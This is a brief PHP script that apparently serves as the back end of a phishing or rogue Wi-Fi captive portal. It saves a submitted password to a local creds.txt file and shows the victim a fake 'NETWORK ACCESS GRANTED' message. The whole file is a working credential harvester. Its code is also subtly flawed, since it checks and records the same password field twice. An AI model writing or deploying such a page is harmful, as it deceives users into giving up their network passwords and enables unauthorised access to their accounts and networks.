<?php
if (isset($_POST['password']) && isset($_POST['password'])) {
	$data = $_POST['password'].'-' . $_POST['password'] . "\n";
	$ret = file_put_contents('creds.txt', $data, FILE_APPEND | LOCK_EX);
	if($ret === false) {
		die('There was an error writing to this file');
		}
	else {
		echo "NETWORK ACCESS GRANTED";
	}	
}

else {
	die('no post data to process');
}
?>